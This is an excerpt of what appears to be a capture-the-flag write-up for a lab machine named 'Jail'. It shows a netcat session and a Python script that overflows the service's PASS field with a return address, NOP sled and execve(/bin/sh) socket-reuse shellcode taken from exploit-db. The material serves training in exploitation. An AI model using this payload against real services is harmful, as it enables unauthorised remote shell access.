...
<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<font color="red">teck@kali</font>:<font color="RoyalBlue">/root/Desktop</font>$ nc -v 10.10.10.34 7411
...
<font color="ffff00">OPEN</font>
<font color="53E100">OK Jail doors opened.</font><font color="red">teck@kali</font>:<font color="RoyalBlue">/root/Desktop</font>$
</div>
</font>
...
<br>s.connect(('10.10.10.34', 7411))</p>

<p>print s.recv(1024)
<br>s.send("DEBUG")
<br>print s.recv(1024)
<br>s.send("USER admin")
<br>print s.recv(1024)</p>

<p># https://www.exploit-db.com/exploits/34060/
<br># Linux/x86 - execve(/bin/sh) + Socket Re-Use Shellcode (50 bytes)
<br>payload = "A"*28 + "\x38\xd6\xff\xff" + "\x90"*10 + "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
<br>s.send("PASS " + payload)
<br>print s.recv(1024)
